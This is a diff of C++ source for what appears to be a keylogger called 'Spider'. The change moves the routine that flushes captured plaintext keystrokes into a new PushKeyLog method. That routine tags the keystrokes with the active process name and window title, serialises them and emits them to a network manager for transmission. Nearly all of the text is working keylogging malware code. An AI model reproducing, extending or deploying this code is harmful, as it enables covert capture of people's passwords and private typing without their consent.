@@ -28,25 +28,31 @@ private:
 
 	void RunKeyLogger() {
 		_eventListener->Register("OnWindowsContextChanged", [&](std::string clientId, SpiderContextChangedEvent &newContext) {
-			SpiderKeyLoggingPayload_SpiderKeyLoggingContextPayload contextPayload;
-			if (_currentContext != nullptr)
-			{
-				contextPayload.set_processname(_currentContext->processname());
-				contextPayload.set_windowsname(_currentContext->windowtitle());
-			}
-
-			SpiderKeyLoggingPayload payload;
-			payload.set_plaintextkeylog(KeyListener->Flush());
-			payload.set_allocated_context(new SpiderKeyLoggingPayload_SpiderKeyLoggingContextPayload(contextPayload));
-
-			auto enveloppe = SpiderSerializer::CreateResponseFromPayload(clientId, payload);
-			_eventEmitter->Emit("SpiderNetworkManager", enveloppe);
+			PushKeyLog(clientId);
 			_currentContext = std::make_unique<SpiderContextChangedEvent>(newContext);
 		});
 
 		ContextAgent->Run();
 		MouseListener->Run();
 		KeyListener->Run(); //This will block current thread.
+	}
+
+	void PushKeyLog(std::string &clientId) const
+	{
+		SpiderKeyLoggingPayload_SpiderKeyLoggingContextPayload contextPayload;
+		if (_currentContext != nullptr)
+		{
+			contextPayload.set_processname(_currentContext->processname());
+			contextPayload.set_windowsname(_currentContext->windowtitle());
+		}
+
+		SpiderKeyLoggingPayload payload;
+		payload.set_plaintextkeylog(KeyListener->Flush());
+		payload.set_allocated_context(new SpiderKeyLoggingPayload_SpiderKeyLoggingContextPayload(contextPayload));
+
+		auto enveloppe = SpiderSerializer::CreateResponseFromPayload(clientId, payload);
+		_eventEmitter->Emit("SpiderNetworkManager", enveloppe);
+		
 	}
 
 public:
